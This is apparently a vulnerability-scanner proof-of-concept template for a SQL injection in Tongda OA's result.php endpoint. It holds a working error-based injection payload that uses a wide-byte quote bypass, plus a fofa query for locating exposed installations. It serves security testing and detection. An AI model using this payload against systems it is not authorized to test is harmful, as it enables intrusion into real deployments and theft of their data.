id: poc-yaml-tongda-oa-result-sqli
info:
  name: 通达OA result.php接口存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 通达OA
  fofa: app="TDXK-通达OA"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /general/score/flow/scoredate/result.php?FLOW_ID=11%BF%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),md5({{.t1}}),1,1)a%20from%20information_schema.tables%20group%20by%20a)b)%23
  expression: "status_code == 200 && \ncontains(body,t2)\n"
transport: http
